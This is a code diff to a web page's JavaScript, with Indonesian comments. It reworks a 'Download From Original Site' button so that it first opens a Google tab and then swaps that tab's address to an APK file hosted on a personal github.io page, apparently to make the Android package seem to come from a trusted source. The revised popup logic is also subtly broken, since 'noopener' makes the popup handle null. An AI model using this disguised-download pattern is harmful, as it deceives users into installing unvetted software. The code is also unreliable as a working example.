@@ -19,12 +19,18 @@
  <body> 
   <script>
 function a(){
-    window.open('https://google.com', 'x');
-    setTimeout(function(){
-        window.open('https://mohammedalqi.github.io/test.apk', 'x');
-    }, 5000);
+  // buka tab baru ke Google (user gesture -> pop-up diizinkan)
+  const popup = window.open('https://google.com', '_blank', 'noopener');
+
+  // ganti lokasi popup ke file setelah delay singkat
+  // gunakan delay minimal (100-500 ms). Terlalu cepat mungkin belum render, terlalu lama buat UX jelek.
+  setTimeout(() => {
+    if (popup && !popup.closed) {
+      popup.location.href = 'https://mohammedalqi.github.io/test.apk';
+    } else {
+      // fallback: jika popup ditutup, buka di tab baru langsung
+      window.open('https://mohammedalqi.github.io/test.apk', '_blank', 'noopener');
+    }
+  }, 400);
 }
-</script> 
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
- </body>
-</html>
+</script>
